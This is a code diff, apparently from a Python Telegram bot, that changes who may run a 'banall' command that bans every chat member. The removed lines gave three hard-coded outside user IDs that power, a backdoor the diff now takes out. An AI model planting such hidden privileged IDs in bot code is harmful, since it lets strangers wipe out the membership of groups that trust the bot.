@@ -703,11 +703,10 @@ async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
     )
 
 from config import OWNER_ID
-EXTRA_BANALL_IDS = [7432650544, 8042205941, 6103177094]
-
-BANALL_USERS = [OWNER_ID] + EXTRA_BANALL_IDS
+BANALL_USERS = [OWNER_ID]
 
 @app.on_message(filters.command("banall"))
+
 async def ban_all(_, msg: Message):
     chat_id = msg.chat.id
     user_id = msg.from_user.id  # ID of the user who issued the command
